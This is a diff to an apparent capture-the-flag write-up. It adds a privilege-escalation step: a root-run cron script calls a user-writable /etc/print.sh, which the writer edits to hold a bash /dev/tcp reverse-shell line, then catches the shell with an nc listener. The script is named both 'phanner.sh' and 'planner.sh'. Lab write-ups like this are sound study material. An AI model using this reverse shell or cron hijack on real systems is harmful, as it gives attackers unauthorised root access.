@@ -13,17 +13,18 @@ Beautify the shell a bit:
 
 
 # Privilege Escalation
-I put `linpeas.sh` in `/tmp` path and have some interesting findings.
-
-1.
+There seems some files in the home folder of `lennie`.
+In the `scripts` folder, we see `phanner.sh`:
+```bash
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
 ```
-╔══════════╣ Unexpected in root
-/vagrant
-/recipe.txt
-/vmlinuz.old
-/vmlinuz
-/incidents
-/initrd.img
-/initrd.img.old
+It is essentially executing `/etc/print.sh` script. Checking this files permissions, we see it is owned by `lennie` and so we can edit it! Welp, in that case, we can simply ask this sh to give us a reverse shell and as the caller `planner.sh` is owned by root and hence run by root, we can get a root shell! Nice.
+```bash
+bash -c "bash -i >& /dev/tcp/10.2.0.159/4444 0>&1"
+echo 'Done!'
 ```
 
+I open `nc` on my local machine (`rlwrap nc -nvlp 4444`) and wait for the root to execute the script as part of its `cron` job.
+``
